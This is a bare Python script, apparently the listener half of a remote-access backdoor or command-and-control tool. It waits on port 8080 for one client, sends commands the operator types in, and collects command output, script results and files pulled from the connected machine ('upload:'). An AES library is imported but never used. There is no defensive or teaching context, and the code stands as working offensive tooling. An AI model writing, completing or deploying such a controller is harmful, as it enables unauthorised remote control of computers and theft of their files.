import socket
from Crypto.Cipher import AES

# Create a server socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 8080))
server.listen(1)

# Wait for a connection
client, address = server.accept()

while True:
    # Send command to client
    command_to_send = input("Enter the command to send: ")
    client.send(command_to_send.encode())

    # Receive data from client based on command
    if command_to_send.startswith('upload:'):
        filename = command_to_send.split(':')[1]
        file_content = client.recv(4096)
        with open(filename, 'wb') as f:
            f.write(file_content)
    elif command_to_send.startswith('runscript:'):
        script_output = client.recv(4096).decode()
        print(f"Script Output: {script_output}")
    else:
        command_output = client.recv(1024).decode()
        print(f"Command Output: {command_output}")